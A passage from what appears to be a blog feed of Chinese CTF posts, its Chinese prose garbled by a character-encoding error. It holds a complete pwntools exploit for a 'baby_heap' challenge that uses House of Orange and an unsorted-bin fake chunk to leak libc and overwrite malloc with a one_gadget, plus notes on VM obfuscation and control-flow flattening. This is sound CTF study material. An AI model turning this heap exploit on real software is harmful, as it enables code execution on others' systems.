<li>ç”±äºaddå‡½æ•°ä¸­ï¼Œchunk_sizeä¼šæˆªæ–­sizeï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦ä¼ªé€ 0x111å¤§å°çš„chunkï¼ˆQ1ï¼‰çš„è¯ï¼Œå°±å¿…é¡»è¦ç”³è¯·ä¸€ä¸ª0x111ï¼Œä¸€ä¸ª0x1å¤§å°çš„chunkæ‰èƒ½æ­£ç¡®ä¼ªé€ sizeæ®µï¼Œè€Œç”³è¯·16ä¸ª0x100å¤§å°çš„chunkæ˜¯ä¸ºäº†æŠŠ0x4040c0-0x4040d0ç½®é›¶ï¼Œå³è«åå…¶å¦™çš„å…«ä¸ªå­—èŠ‚ï¼ˆQ2ï¼‰å’Œfake_chunkçš„prev_sizeæ®µ<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">Â  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload) Â  # chunk16</span><br><span class="line">alloc(1,payload) Â  Â  Â  # chunk17</span><br></pre></td></tr></table></figure></li>
<li>houseofOrangeï¼Œæ­¤æ—¶unsortedbinä¸­ä¼šæœ‰ä¸€ä¸ªå¤§å°ä¸º0xdc0çš„chunkï¼Œè®°ä¸ºvictim<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
<li>ä¼ªé€ victim.bk = 0x4040c8ï¼ˆfake_chunk_headï¼‰<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
<li>è¿ç»­ç”³è¯·2ä¸ªchunkï¼Œåœ¨chunk_ptr[0]çš„ä½ç½®å†™å…¥malloc_gotï¼Œè°ƒç”¨showå‡½æ•°ä¸­çš„writeï¼Œå³å¯è·å¾—libc<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base Â  ---&gt; Â  &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
<li>è°ƒç”¨editå‡½æ•°ï¼Œåœ¨chunk_ptr[0]æŒ‡å‘çš„åœ°å€ï¼ˆå³mallocçš„libcåœ°å€ï¼‰å†™å…¥ogï¼Œè°ƒç”¨mallocå³å¯ææƒ<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base Â  ---&gt; Â  &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x03-ä¸€äº›é—®é¢˜"><a href="#0x03-ä¸€äº›é—®é¢˜" class="headerlink" title="0x03  ä¸€äº›é—®é¢˜"></a>0x03  ä¸€äº›é—®é¢˜</h1><p>Q1ï¼š ä¸ºä»€ä¹ˆå¿…é¡»è¦ä¼ªé€ 0x111å¤§å°çš„chunkå‘¢ï¼Ÿ<br>Q2ï¼š æˆ‘æ„Ÿè§‰ç”³è¯·8ä¸ªchunkå°±å¤Ÿäº†â€¦æŠŠfake_chunk_headä¿®æ”¹ä¸º0x4040c0ä¹Ÿä¸æ˜¯ä¸è¡Œå•Šï¼Ÿ</p>
<h1 id="0x04-å®Œæ•´EXP"><a href="#0x04-å®Œæ•´EXP" class="headerlink" title="0x04  å®Œæ•´EXP"></a>0x04  å®Œæ•´EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>è½¯ä»¶ä¿æŠ¤ï¼šæ§åˆ¶æµå¹³å¦åŒ–ä¸VMé€†å‘</title>
    <url>/2023/09/28/blog8/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
å›å®¶æ™šä¸Šä¼‘æ¯ï¼Œçœ‹ç‚¹reæ¶¨æ¶¨è§è¯†
</blockquote>

<span id="more"></span>
<h1 id="0x00-VM"><a href="#0x00-VM" class="headerlink" title="0x00  VM"></a>0x00  VM</h1><ul>
<li><p><strong>èƒŒæ™¯</strong><br>  Cä»£ç éƒ½ä¼šè¯»å§ï¼ŒIDAåæ±‡ç¼–å‡ºæ¥çš„ä¸œè¥¿ä»”ç»†çœ‹è¿˜æ˜¯èƒ½çœ‹æ˜ç™½çš„ã€‚<br>  é‚£æˆ‘è¦å¢åŠ ä½ é€†å‘çš„éš¾åº¦ï¼Œå°±å¾—è®©ä½ çœ‹ä¸æ‡‚ã€‚<br>  å¥½ï¼Œ<strong>æˆ‘æŠŠæ¯æ¡æ±‡ç¼–æŒ‡ä»¤å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼Œç»™æ¯ä¸ªå‡½æ•°ä¸€ä¸ªç‹¬æœ‰çš„ç¼–å·(opcode)</strong>ã€‚<br>  å†<strong>åšä¸€ä¸ªç´¢å¼•è¡¨</strong>ï¼Œæˆ‘ä½¿ç”¨opcode1å°±ç­‰ä»·äºä½¿ç”¨å‡½æ•°1.</p>
<p>  æ¯”å¦‚â€œæ±‡ç¼–æŒ‡ä»¤Aâ€â€”&gt;å°è£…ä¸ºâ€œå‡½æ•°Aâ€â€”&gt;opcodeä¸º1ã€‚<br>  ç„¶åå®šä¹‰ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„functionï¼š</p>
<pre><code>  functionçš„indexä¸ºopcode
  functionçš„å†…å®¹ä¸ºâ€œæŒ‡å‘å¯¹åº”å‡½æ•°çš„æŒ‡é’ˆâ€ã€‚
</code></pre><p>  é‚£ä¹ˆï¼Œå¦‚æœæˆ‘è¦ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤Aï¼Œåªéœ€è¦æ‰§è¡Œfunction[1]å³å¯ã€‚<br>  è¿™æ ·ä½ IDAåæ±‡ç¼–å°±ä¼šå‡ºæ¥ä¸€å †ç±»ä¼¼äºswitch caseçš„ä¸œè¥¿ï¼Œæ¯”ä»¥å‰æ›´éš¾è¯»äº†ã€‚</p>
<p>  å¦‚æœä½ æœ‰ç›¸å…³ç»éªŒï¼Œé‚£ä¹ˆå¯ä»¥ç±»æ¯”ä¸€ä¸‹ï¼š<br>  è¿™ç©æ„å„¿å«åšVMï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è™šæ‹Ÿæœºå˜›ã€‚<br>  å°±æ˜¯ä½ åœ¨ç‰©ç†æœºé‡Œé¢è‡ªå·±å†™äº†ä¸ªè™šæ‹Ÿæœºï¼Œç„¶åè‡ªå·±ç”¨â€œä½ è‡ªå·±çš„è™šæ‹ŸæœºæŒ‡ä»¤é›†â€å†™äº†ä¸ªç¨‹åºã€‚</p>
</li>
</ul>
<ul>
<li><p><strong>KEY</strong><br>  æ¦‚æ‹¬æ¥è®²ä½ éœ€è¦å¯¹åº”èµ·è¿™ä¹ˆå‡ ä¸ªä¸œè¥¿ï¼š_ip, op_function_array, op_i</p>
<ol>
<li>_ipï¼šipå¯„å­˜å™¨ï¼ŒæŒ‡ç¤ºâ€œå½“å‰è¿è¡Œåˆ°å“ªä¸€æ¡æŒ‡ä»¤â€<ul>
<li>ç‰¹å¾ï¼šåœ¨æ¯ä¸ªå‡½æ•°ä¸­ä¼šæœ‰ ip += num;ä¹‹ç±»çš„æŒ‡ä»¤ï¼Œè¡¨ç¤ºipå¯„å­˜å™¨è¯»å–äº†numä¸ªå­—èŠ‚çš„æŒ‡ä»¤ï¼Œå½“å‰æ­£æŒ‡å‘ä¸‹ä¸€ä¸ªå¾…æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</li>
</ul>
</li>
<li>op_function_arrayï¼šç´¢å¼•è¡¨ï¼Œç¡®å®šå‡½æ•°æŒ‡å‘å“ªä¸ªä½ç½®</li>
<li><p>op_iï¼šç¬¬iä¸ªæ“ä½œæ•°ï¼Œæ¯”å¦‚<code>mov eax,ebx</code>ä¸­ï¼Œop1å°±æ˜¯eaxï¼Œop2å°±æ˜¯ebx</p>
<p>æ­£å¸¸çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯è¿™æ ·çš„ï¼š<code>cmd arg1,arg2</code><br>åœ¨VMä¹Ÿè¦æœ‰è¿™æ ·çš„ï¼š<code>opcode op1,op2</code></p>
</li>
</ol>
</li>
<li><p><strong>å¸¸è§æ›¿æ¢å˜é‡</strong></p>
<ul>
<li>stack</li>
<li>regs<ul>
<li>eax/ebx/ecx/edx</li>
<li>flag</li>
</ul>
</li>
<li>esp</li>
</ul>
</li>
<li><p><strong>å¸¸è§å®ç°æŒ‡ä»¤</strong></p>
<ol>
<li>nop</li>
<li>mov<ol>
<li>ä¸¤ä¸ªæ“ä½œæ•°</li>
<li>å°†æ“ä½œæ•°2èµ‹å€¼ç»™æ“ä½œæ•°1ï¼ˆæˆ–è€…æ“ä½œæ•°1ä½œä¸ºindexæŒ‡å‘çš„æŸå—å†…å­˜ï¼‰</li>
</ol>
</li>
<li>push<ol>
<li>æŸä¸ªå€¼++ï¼ˆä¸å¦¨ç§°â€œæŸä¸ªå€¼â€ä¸ºAï¼‰ï¼Œå¹¶å°†ï¼ˆå†…å­˜åœ°å€addr+Aï¼‰çš„å€¼è®¾ç½®ä¸ºæ“ä½œæ•°1</li>
<li>è¿™é‡Œçš„Aå°±æ˜¯esp/rspå¯„å­˜å™¨</li>
<li>å†…å­˜åœ°å€addrå°±æ˜¯è‡ªå·±åšçš„stack</li>
<li>âš  æŸäº›vmå¯èƒ½ä¼šå°†push numå’Œpush regsåˆ†å¼€å®ç°</li>
</ol>
</li>
<li>pop<ol>
<li>espâ€”</li>
</ol>
</li>
<li>ja/jz/jnz/jl<ol>
<li>è·Ÿe_flagæœ‰å…³</li>
<li>ä¼šæ”¹å˜eip</li>
</ol>
</li>
<li>cmp<ol>
<li>eflag = val1 - val2</li>
</ol>
</li>
</ol>
</li>
<li><p>è¡¥å……</p>
<ol>
<li>æœ‰çš„æ—¶å€™vmä¼šè‡ªå·±å®ç°/é›†æˆä¸€äº›å‡½æ•°ï¼Œæ¯”å¦‚puts</li>
<li>ä¸€äº›æƒ³æ³•ï¼šæœ‰æ—¶é—´å¯ä»¥è¯»ä¸€ä¸‹jadxçš„æºç ï¼Œå› ä¸ºjadxæ˜¯å¯¹æŠ—jvmçš„ï¼Œæ‰€ä»¥åªéœ€è¦æ›´æ¢ä¸€ä¸‹æŒ‡ä»¤é›†ï¼Œå¾ˆæœ‰å¯èƒ½å°±å¯ä»¥è¿ç§»åˆ°ä¸åŒå¹³å°ä¸Šå¯¹æŠ—ä¸åŒçš„vm</li>
</ol>
</li>
</ul>
<ul>
<li>VM pwn<br>æˆ‘çŒœåº”è¯¥æ˜¯è‡ªå·±å®ç°çš„è™šæ‹Ÿæœºå‡ºç°äº†ç¼“å†²åŒºæ¼æ´ç„¶åå¯ä»¥ç»™pwnæ‰â€¦</li>
</ul>
<h1 id="0x01-æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰"><a href="#0x01-æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰" class="headerlink" title="0x01 æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰"></a>0x01 æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰</h1><ul>
<li><p><strong>èƒŒæ™¯</strong><br>  å…ˆæ¥çœ‹ä¸€æ®µä»£ç </p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=0;i&lt;10;i++)</span><br><span class="line">&#123;</span><br><span class="line">	if(i%2 == 0)</span><br><span class="line">		printf(&#x27;a&#x27;);</span><br><span class="line">	else</span><br><span class="line">		printf(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  è¿™æ®µä»£ç æ•´ç†æˆCFGï¼ˆå°±æ˜¯ä½ IDAåˆšå¼€å§‹åŠ è½½è¿›å…¥ä»¥åï¼Œé»˜è®¤å‡ºç°çš„ç¨‹åºæ§åˆ¶æµå›¾ï¼‰ï¼Œæƒ³éƒ½ä¸ç”¨æƒ³è¿™æ®µä»£ç çš„CFGè‚¯å®šç›¸å¯¹ç®€å•</p>
<p>  ä½†ä½¿ç”¨FLAä¹‹åï¼ŒCFGå°±ä¼šå˜å¾—æå…¶å¤æ‚ï¼ŒåŒæ—¶åæ±‡ç¼–å‡ºæ¥çš„ä¼ªä»£ç ä¹Ÿä¼šå¾ˆéš¾è¯»ï¼Œè¿™å°±å¤§å¤§å¢åŠ äº†é€†å‘åˆ†æçš„éš¾åº¦</p>
</li>
<li><p><strong>åŸç†</strong><br>  æ§åˆ¶æµå¹³å¦åŒ–çš„åŸºæœ¬ç»“æ„ä¸ºï¼šå…¥å£å— + ä¸»åˆ†å‘å— + å­åˆ†å‘å— + åŸåŸºæœ¬å— + è¿”å›å— + é¢„åˆ†å‘å™¨<br>  åœ¨â€œæ¨èé˜…è¯»â€çš„ç¬¬äºŒæ¡ä¸­ï¼Œæœ‰ä¸€å¼ å›¾ç‰‡èƒ½å¤Ÿå¸®åŠ©ç†è§£ä»¥ä¸Šæœ¯è¯­æ˜¯ä»€ä¹ˆï¼Œä½†å› ä¸ºè²Œä¼¼éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œæ‰€ä»¥è¿™è¾¹å°±ä¸è´´åœ¨åšå®¢é‡Œäº†ã€‚</p>
<ol>
<li>å…¥å£å—ï¼ˆæœ‰æ—¶ä¹Ÿç§°â€œåºè¨€â€ï¼‰ï¼šè°ƒèŠ‚å †æ ˆã€åˆå§‹åŒ–ã€åšä¸€ä¸ªåˆ†å‘çš„åˆå§‹å·¥ä½œ</li>
<li>ä¸»åˆ†å‘å—ï¼šå†³å®šè·³åˆ°å“ªä¸ªæ¬¡åˆ†å‘å—ï¼Œè¿›è€Œè¿›å…¥å“ªä¸ªâ€œåŸåŸºæœ¬å—â€</li>
<li>å­åˆ†å‘å—ï¼šæ— ç”¨å—ï¼Œçº¯çº¯æ··æ·†ç”¨çš„</li>
<li>åŸåŸºæœ¬å—ï¼šåŸç¨‹åºé€»è¾‘ï¼Œä½†è¢«å¹³å¦ä»¥åæˆ‘ä»¬ä¸çŸ¥é“è¿™å‡ ä¸ªå—çš„å…ˆåæ‰§è¡Œé¡ºåºæ˜¯ä»€ä¹ˆ</li>
<li>è¿”å›å—ï¼šç»“æŸç¨‹åº/ç»“æŸåˆ†æ”¯</li>
<li>é¢„åˆ†å‘å™¨ï¼šè¿”å›â€œä¸»åˆ†å‘å—â€</li>
</ol>
<ul>
<li><p><strong>FLAå¯¹æŠ—å·¥å…·å®‰è£…</strong><br> <a href="https://github.com/cq674350529/deflat">GitHub - cq674350529/deflat: use angr to deFLAfuscation</a></p>
<p>è¯¥å·¥å…·åŸºäºangrï¼Œä½¿ç”¨ä¹‹å‰éœ€è¦ç”¨pipå®‰è£…angr</p>
<p><code>pip3 install angr(åœ¨å¦å¤–ä¸€ç¯‡æ•™ç¨‹é‡Œç”¨çš„æ˜¯sudo proxychains pip3 install angr)</code></p>
<p>ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code>-f file
-addr entry_addr
ä¾‹å¦‚ï¼š`python3 deflat.py -f ./a.out --addr 0x400510`
</code></pre><p>æ¨èè¯»ä¸€ä¸‹deflat.pyçš„æºç ï¼Œé’ˆå¯¹ç‰¹æ®Šæƒ…å†µå»ä¿®æ”¹è¿™ä¸ªä»£ç </p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>FLAå¯¹æŠ—å·¥å…·åŸç†</strong><ol>
<li>æºç è§£è¯»<ol>
<li>å‚æ•°è®¾ç½®<ol>
<li>load_options = {â€˜auto_load_libcsâ€™: False}<ul>
<li>ä¸æ­¥å…¥æ ‡å‡†åº“å‡½æ•°(å¦‚printf)ï¼Œå‡å°‘ä»£ç åˆ†æé‡</li>
</ul>
</li>
</ol>
</li>
<li>to_supergraphå‡½æ•°ï¼šå¯¹â€œä»¥callç»“å°¾çš„åŸåŸºæœ¬å—åšä¸€äº›å¤„ç†â€<ol>
<li>è¿™ä¸€å—å„¿æ²¡ç†è§£</li>
<li>å¥½åƒåšäº†ä¸ªä»€ä¹ˆâ€œä¸¢å¼ƒâ€™ä¸‰ç¯åˆ°é›¶ç¯â€˜è¿™ç§æ¯”å¦‚syscallä¹‹ç±»çš„è¶Šç•Œâ€ã€åˆ é™¤ä¸€äº›å­¤ç«‹èŠ‚ç‚¹ä¹‹ç±»çš„å·¥ä½œ</li>
</ol>
</li>
<li>é¡µé¢å¯¹é½</li>
<li>â€œå—â€å¤„ç†<ol>
<li>åºè¨€ï¼šå…¥åº¦ä¸º0</li>
<li>returnå—ï¼šå‡ºåº¦ä¸º0 || å‡ºåˆ†æ”¯ä¸º0ï¼ˆå‡ºåˆ†æ”¯æˆ‘æ²¡ç†è§£æ˜¯ä»€ä¹ˆï¼‰</li>
<li>é¢„åˆ†å‘å™¨ï¼šåç»§ä¸ºä¸»åˆ†å‘å™¨ï¼ˆä¸»åˆ†å‘å™¨å‰é©± &amp;&amp; ä¸æ˜¯åºè¨€ï¼‰</li>
<li>ä¸»åˆ†å‘å™¨ï¼šè·Ÿåœ¨åºè¨€åé¢ï¼ˆåºè¨€åç»§ï¼‰</li>
<li>åŸåŸºæœ¬å—<ol>
<li>ä¸é¢„å¤„ç†å™¨ç›¸å…³ï¼ˆä¸è¿‡å¾—çœ‹FLAçš„ä½œè€…æ€ä¹ˆæ··æ·†çš„ï¼Œéœ€è¦è‡ªå·±å»æ”¹è„šæœ¬æ¥åšå¯¹æŠ—ï¼‰</li>
<li>æ˜¯â€œåºè¨€â€â€œè¿”å›å—â€æˆ–â€œé¢„å¤„ç†å™¨â€ï¼Œä¸”å—é•¿ï¼ˆbytecodeæ•°ï¼‰&gt; 8</li>
</ol>
</li>
<li>æ— ç”¨å—<ol>
<li>ä¸æ˜¯â€œåºè¨€â€â€œè¿”å›å—â€å’Œâ€œé¢„å¤„ç†å™¨â€</li>
</ol>
</li>
</ol>
</li>
<li>é‡åšäºŒè¿›åˆ¶æ–‡ä»¶<ol>
<li>æœ‰ç‚¹æ²¡ç†è§£ï¼Œå®ƒç”¨åˆ°äº†ç¬¦å·æ‰§è¡Œçš„çŸ¥è¯†ï¼Œåé¢å†æ¥ç»§ç»­è¯»ä¸€ä¸‹å§</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ul>
<ul>
<li><p><strong>æ³¨</strong></p>
<ul>
<li>IDA7.6ä¹‹åçš„ç‰ˆæœ¬è‡ªå¸¦äº†ä¸€ç‚¹å¹³å¦åŒ–å¤„ç†ï¼Œç®€å•çš„å¹³å¦åŒ–å¯èƒ½ä¼šè¢«åˆ†æå¹¶è¿˜åŸ</li>
<li>andoridå¹³å°ä¸Šçš„ollvm-FLAæ›´æˆç†Ÿä¸€äº›ï¼Œæ‰€ä»¥deflat.pyæœ‰æ¯”è¾ƒå¤šçš„æ‰‹æœºå¹³å°å¤„ç†æ¨¡å—</li>
</ul>
</li>
<li><p>æ¨èé˜…è¯»<br><a href="https://www.wireghost.cn/2020/08/28/OLLVM%E9%80%9A%E7%94%A8%E5%8F%8D%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%A0%94%E7%A9%B6/">OLLVMé€šç”¨åå¹³å¦åŒ–ç ”ç©¶ | Shell In Ghost (wireghost.cn)</a><br><a href="https://jev0n.com/2022/07/08/ollvm-1.html">OLLVMæ··æ·†å­¦ä¹ ï¼ˆ1ï¼‰â€”â€”æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰ - æ€æ³‰ | Jev0n</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>SoftwareProtection</tag>
        <tag>VMRe</tag>
        <tag>FLA</tag>
      </tags>
  </entry>
  <entry>
    <title>Heapå¸¸è§„åˆ©ç”¨æ–¹å¼æ€»ç»“</title>
    <url>/2023/09/22/blog7/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
å¤§ä½¬éƒ½æœ‰è¿™ç§æ€»ç»“æ€§çš„wpï¼Œé‚£æˆ‘ä¹Ÿé‚¯éƒ¸å­¦æ­¥ä¸€ä¸‹ :P
</blockquote>

<span id="more"></span>
<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h1 id="Tcachebin-Attack"><a href="#Tcachebin-Attack" class="headerlink" title="Tcachebin Attack"></a>Tcachebin Attack</h1><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><ul>
<li><strong>æ¦‚è¿°</strong><br>åœ¨<code>free(chunk_ptr)</code>åå¹¶æ²¡æœ‰<code>chunk_ptr=0</code>ï¼Œå¯¼è‡´æˆ‘ä»¬ä»ç„¶èƒ½é€šè¿‡<code>chunk_ptr</code>å¯¹è¿™ä¸ªchunkè¿›è¡Œä¿®æ”¹</li>
<li>Fastbin Attack</li>
<li></li>
</ul>
<h1 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h1><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p><code>Unsortedbin attack</code>åˆ†ä¸º<code>leak</code>å’Œ<code>write</code>ä¸¤éƒ¨åˆ†</p>
<h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><p>å½“unsortedbinä¸­æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªchunkæ—¶ï¼Œè¯¥chunkçš„fdå’Œbkä¼šæŒ‡å‘unsortdedbinçš„åœ°å€<br>è€Œè¿™ä¸ªåœ°å€å¯ä»¥ç”¨idaæŸ¥çœ‹å¯¹åº”libcçš„malloc_trimå‡½æ•°æ‰¾åˆ°  </p>
<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>writeæ˜¯æŒ‡<br>æ­¤å¤–ï¼Œä½libcç‰ˆæœ¬çš„unsortedbinå¯ä»¥åƒtcachebinä¸€æ ·ï¼Œé€šè¿‡ä¼ªé€ é“¾æ¥ç”³è¯·ä¸€ä¸ªfake_chunk</p>
<ul>
<li>ç”³è¯·fake_chunk<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**2.23ç‰ˆæœ¬**  </span><br><span class="line">- åˆçŠ¶æ€  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"></span><br><span class="line">&gt; æ­¤æ—¶æˆ‘ä»¬ä»¤chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line">- æœ«çŠ¶æ€  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"></span><br><span class="line">&gt; è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkå³å¯ç”³è¯·åˆ°fake_chunk</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="HouseofOrange"><a href="#HouseofOrange" class="headerlink" title="HouseofOrange"></a>HouseofOrange</h1><h2 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>HouseofOrangeæ˜¯åœ¨ç¨‹åºæ²¡æœ‰å¯ä»¥æ“æ§çš„freeæ—¶ï¼Œåˆ©ç”¨ptmallocçš„ç®¡ç†æœºåˆ¶å¼ºè¡Œåˆ¶é€ å‡ºä¸€ä¸ªunsortedbinä¸­çš„chunkçš„æŠ€æœ¯ã€‚    </p>
<h2 id="ä¼ªé€ chunkéœ€æ±‚"><a href="#ä¼ªé€ chunkéœ€æ±‚" class="headerlink" title="ä¼ªé€ chunkéœ€æ±‚"></a>ä¼ªé€ chunkéœ€æ±‚</h2><ol>
<li>top_chunkçš„ç»“æŸåœ°å€å¿…é¡»é¡µå¯¹é½  <ul>
<li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œptmallocè®¾ç½®top_chunkä¸º0x21000ï¼Œæˆ‘ä»¬ç”³è¯·ä¸€ä¸ª0x10çš„chunk0åï¼Œchunk0åŠ ä¸Šchunk_headæ˜¯0x20å¤§å°ï¼Œæ­¤æ—¶top_chunkåˆ‡å‰²åè¿˜å‰©ä¸‹0x20fe0å¤§å°ï¼Œä¸ºäº†é¡µå¯¹é½ï¼Œæˆ‘ä»¬ä¼ªé€ top_chunkçš„å¤§å°ä¸º0xfe0å³å¯  </li>
</ul>
</li>
<li>top_chunk.size &gt;= MINSIZE  </li>
<li>top_chunk.size &lt; chunk_size + MINSIZE</li>
<li>top_chunk.prev_inuse == 1<ul>
<li>ç¬¬ä¸€ç‚¹ä¸­è¯´çš„0xfe0è¦å˜ä¸º0xfe1 </li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (1) -- Basis</title>
    <url>/2023/09/30/blog9/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è¿ˆå‘è‡ªåŠ¨åŒ–çš„ç¬¬ä¸€æ­¥â€”â€”  
</blockquote>

<span id="more"></span>
